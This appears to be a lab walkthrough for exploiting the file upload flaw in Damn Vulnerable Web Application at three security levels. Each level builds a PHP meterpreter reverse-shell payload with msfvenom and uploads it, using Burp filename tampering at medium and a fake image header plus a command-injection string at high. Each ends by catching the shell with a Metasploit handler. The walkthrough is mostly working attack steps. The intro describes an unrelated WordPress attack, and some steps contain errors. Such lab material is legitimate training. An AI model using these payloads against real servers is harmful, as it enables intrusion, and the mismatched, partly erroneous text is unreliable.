- The Metasploit Framework is a penetration testing toolkit, exploit development platform, and research tool that includes hundreds of working remote exploits for a variety of platforms. It helps pen testers to verify vulnerabilities and manage security assessments.

- In this task, we will perform multiple attacks on a vulnerable PHP website (WordPress) in an attempt to gain sensitive information such as usernames and passwords. You will also learn how to use the WPScan tool to enumerate usernames on a WordPress website, and how to crack passwords by performing a dictionary attack using an msf auxiliary module.


#### Security level - low
- Open Terminal
	> sudo su
	> cd
	> msfvenom -p php/meterpreter/reverse_tcp LHOST= #hostip LPORT=4444 -f raw
	
- The raw payload is generated in the terminal window. Select the payload, right-click on it, and click **Copy** from the context menu to copy the payload.
- Now, in the terminal window, type **cd /home/attacker/Desktop/** and press **Enter** to navigate to the **Desktop**.
- Type **pluma upload.php** and press **Enter** to launch the **Pluma** text editor and paste the payload and save the file.
- Click the **Firefox** icon from the top section of **Desktop**, type **http://10.10.10.16:8080/dvwa/login.php**. Into the address bar and press **Enter**.
- The **DVWA** login page appears; enter the **Username** and **Password** as **admin** and **password**. Click the **Login** button.
- The **Welcome to Damn Vulnerable Web Application!** Page appears. Click **DVWA Security** in the left pane to view the DVWA security level.
- Change the security level from impossible to low by selecting **Low** from the drop-down list and clicking the **Submit** button.
- Click the **File Upload** option from the left pane.
- The **Vulnerability: File Upload** page appears; click the **Browse…** button to upload a file.
- When the **File Upload** window appears, navigate to the **Desktop** location, select the payload file **upload.php**, and click **Open**.
- Observe that the selected file (**upload.php**) appears to the right of **Browse…** button.
- Now, click the **Upload** button to upload the file to the database.
- You will see a message saying that the file has been uploaded successfully, with the location of the file. Note the location of the file and minimize the browser window.
- Open Terminal
	> sudo su
	> cd
	> msfconsole 
	> use exploit/multi/handler (to set up listener)
	> set payload php/meterpreter/reverse_tcp
	> set LHOST #hostip 
	> set LPORT 4444
	> run (to start the listener)
	
- Switch back to the **Mozilla Firefox** window where the **DVWA** website is open. Open a new tab, type **http://10.10.10.16:8080/dvwa/hackable/uploads/upload.php** in the address bar, and press **Enter** to execute the uploaded payload.
- Switch back to the **Terminal** window and observe that a **Meterpreter session** has successfully been established with the victim system.
- In the meterpreter command line, type **sysinfo** and press **Enter** to view the system details of the victim machine.




#### Security level - medium

- Open Terminal
	> sudo su
	> cd
	> msfvenom -p php/meterpreter/reverse_tcp LHOST= #hostip LPORT=3333 -f raw
	
- The raw payload is generated in the terminal window. Select the payload, right-click on it, and click **Copy** from the context menu to copy the payload.
- Now, in the terminal window, type **cd /home/attacker/Desktop/** and press **Enter** to navigate to the **Desktop**.
- Type **pluma medium.php.jpg** and press **Enter** to launch the **Pluma** text editor and paste the payload and save the file.
- Click the **Firefox** icon from the top section of **Desktop**, type **http://10.10.10.16:8080/dvwa/login.php**. Into the address bar and press **Enter**.
- The **DVWA** login page appears; enter the **Username** and **Password** as **admin** and **password**. Click the **Login** button.
- The **Welcome to Damn Vulnerable Web Application!** Page appears. Click **DVWA Security** in the left pane to view the DVWA security level.
- Change the security level from impossible to low by selecting **medium** from the drop-down list and clicking the **Submit** button.
- Click the **File Upload** option from the left pane.
- The **Vulnerability: File Upload** page appears; click the **Browse…** button to upload a file.
- When the **File Upload** window appears, navigate to the **Desktop** location, select the payload file **medium.php.jpg**, and click **Open**.
- Observe that the selected file (**medium.php.jpg**) appears to the right of **Browse…** button.
- Now, before uploading the file, set up a **Burp Suite** proxy. Start by configuring the proxy settings of the browser.
- Click the **Open Menu** icon in the right corner of the menu bar and select **Preferences** from the list.
- The **General** settings tab appears. In the **Find in Preferences** search bar, type **proxy**, and press **Enter**.
- A **Connection Settings** window appears; select the **Manual proxy configuration** radio button and ensure that the **HTTP Proxy** is set to **127.0.0.1** and **Port** as **8080**. Ensure that the **Use this proxy server for all protocols** checkbox is selected and click **OK**. Close the **Preferences** tab.
- Open Burp Suite
	- In the **Proxy** settings, by default, the **Intercept** tab opens-up. Observe that the interception is active by default, as the button says **Intercept is on**. Leave it running.
	- Switch back to the browser window and click the **Upload** button under the **Vulnerability: File Upload** section to upload the payload file.
	- Switch back to the **Burp Suite** window. Observe that the request has been captured and displayed in the raw format under the **Raw** tab. In the **filename** field, you will see the name of the file to be uploaded as **medium.php.jpg**.
	- Change the **filename** to **medium.php** and click the **Forward** button to forward the request.
	- Now, turn the interception off by clicking on the **Intercept is on** button. The button now says **Intercept is off** and close Burp Suite.
	- You will see a message saying that the file has been uploaded successfully, with the location of the file. Note the location of the file and minimize the browser window.
- Remove the proxy settings and change it back to no proxy.
- Open Terminal
	> sudo su
	> cd
	> msfconsole 
	> use exploit/multi/handler (to set up listener)
	> set payload php/meterpreter/reverse_tcp
	> set LHOST #hostip 
	> set LPORT 3333
	> run (to start the listener)
	
- Switch back to the **Mozilla Firefox** window where the **DVWA** website is open. Open a new tab, type **http://10.10.10.16:8080/dvwa/hackable/uploads/medium.php** in the address bar, and press **Enter** to execute the uploaded payload.
- Switch back to the **Terminal** window and observe that a **Meterpreter session** has successfully been established with the victim system.
- In the meterpreter command line, type **sysinfo** and press **Enter** to view the system details of the victim machine.



#### Security level - high

- Open Terminal
	> sudo su
	> cd
	> msfvenom -p php/meterpreter/reverse_tcp LHOST= #hostip LPORT=2222 -f raw
	
- The raw payload is generated in the terminal window. Select the payload, right-click on it, and click **Copy** from the context menu to copy the payload.
- Now, in the terminal window, type **cd /home/attacker/Desktop/** and press **Enter** to navigate to the **Desktop**.
- Type **pluma high.jpeg** and press **Enter** to launch the **Pluma** text editor and paste the payload.
- Edit the payload file by adding **GIF98** to the first line and then press **Ctrl+S** to save the context.
- Click the **Firefox** icon from the top section of **Desktop**, type **http://10.10.10.16:8080/dvwa/login.php**. Into the address bar and press **Enter**.
- The **DVWA** login page appears; enter the **Username** and **Password** as **admin** and **password**. Click the **Login** button.
- The **Welcome to Damn Vulnerable Web Application!** Page appears. Click **DVWA Security** in the left pane to view the DVWA security level.
- Change the security level from impossible to low by selecting **high** from the drop-down list and clicking the **Submit** button.
- Click the **File Upload** option from the left pane.
- The **Vulnerability: File Upload** page appears; click the **Browse…** button to upload a file.
- When the **File Upload** window appears, navigate to the **Desktop** location, select the payload file **high.jpeg**, and click **Open**.
- Observe that the selected file (**high.jpeg**) appears to the right of **Browse…** button.
- Now, click the **Upload** button to upload the file to the database.
- You will see a message saying that the file has been uploaded successfully, with the location of the file. Note the location of the file and minimize the browser window.
- Now, click the **Command Injection** option in the left pane. The **Vulnerability: Command Injection** window appears; in the **Enter an IP address** field, type **|copy C:\wamp64\www\DVWA\hackable\uploads\high.jpeg C:\wamp64\www\DVWA\hackable\uploads\shell.php** and click the **Submit** button.
- Open Terminal
	> sudo su
	> cd
	> msfconsole 
	> use exploit/multi/handler (to set up listener)
	> set payload php/meterpreter/reverse_tcp
	> set LHOST #hostip 
	> set LPORT 2222
	> run (to start the listener)
	
- Switch back to the **Mozilla Firefox** window where the **DVWA** website is open. Open a new tab, type **http://10.10.10.16:8080/dvwa/hackable/uploads/shell.php** in the address bar, and press **Enter** to execute the uploaded payload.
- Switch back to the **Terminal** window and observe that a **Meterpreter session** has successfully been established with the victim system.
- In the meterpreter command line, type **sysinfo** and press **Enter** to view the system details of the victim machine.
